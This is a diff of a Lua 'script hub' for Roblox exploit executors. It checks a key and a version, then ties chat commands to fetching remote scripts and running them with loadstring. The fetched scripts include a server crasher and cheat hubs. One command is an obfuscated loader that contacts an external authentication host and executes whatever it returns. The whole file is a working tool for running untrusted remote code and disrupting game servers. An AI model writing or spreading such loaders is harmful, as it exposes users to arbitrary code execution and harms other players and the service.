@@ -1,25 +1,40 @@
-print("Enter A Diffrent Key And Press Execute")
-if Key == "V1.4GYt67yG7g7yYnjhFCfcxazeDCgt7668i7jNJHF8" or "🔥Flame🔥Script🔥Hub🔥Permanent🔥Key🔥12gh347Gy6G6873hd7🔥" then
-print("Key Is Being Processed...")
-wait(3)
-print("Key Accepted!")
-print("Type A Command To Load A Script!")
+print("🔥Flame-Script-Hub🔥 Checking Key... Make Sure Your Using A Vaild Key.")
+wait(5)
+if Key == "Fl@m3ScR1PTh0b-Hi09rmc88NUs77a-728vsb57ghduJ8" then
+print("🔥Flame-Script-Hub🔥 Key Accepted!")
+wait(1)
+print("🔥Flame-Script-Hub🔥 Checking Version... Make Sure You Have Version V1.5")
+wait(5)
+if Version == "V1.5" then
+print("🔥Flame-Script-Hub🔥 Version Matched!")
+wait(1)
+print("🔥Flame-Script-Hub🔥 Type A Command To Load A Script!")
+
+
+
+
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == a then
 loadstring(game:HttpGet('https://raw.githubusercontent.com/SpaceYes/Lua/Main/DaHood.Lua'))()
 end
 end)
+
+
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == b then
 loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SuperCustomServerCrasher'))()
 end
 end)
+
+
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == c then
 getgenv().mainKey = "nil"
 local a,b,c,d,e=loadstring,request or http_request or (http and http.request) or (syn and syn.request),assert,tostring,"https://api.eclipsehub.xyz/auth"c(a and b,"Executor not Supported")a(b({Url=e.."\?\107e\121\61"..d(mainKey),Headers={["User-Agent"]="Eclipse"}}).Body)()
 end
 end)
+
+
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == d then
 getgenv().mainKey = "nil"
@@ -36,11 +51,15 @@ while true do
 end
 end
 end)
+
+
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == e then
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
 end
 end)
+
+
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == g then
 local Humanoid = game.Players.LocalPlayer.Character.Humanoid;
@@ -301,14 +320,21 @@ Humanoid:FindFirstChild("HeadScale"):Destroy()
 wait(1)
     end
 end)
+
+
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == h then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/RealZzHub/MainV2/main/Main.lua"))()
 end
 end)
+
+
 game.Players.LocalPlayer.Chatted:Connect(function(msg)
     if msg == i then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/wawsdasdacx/ohascriptnrrewading/main/jbsaxcriptidk1"))()
 end
 end)
+
+
+end
 end
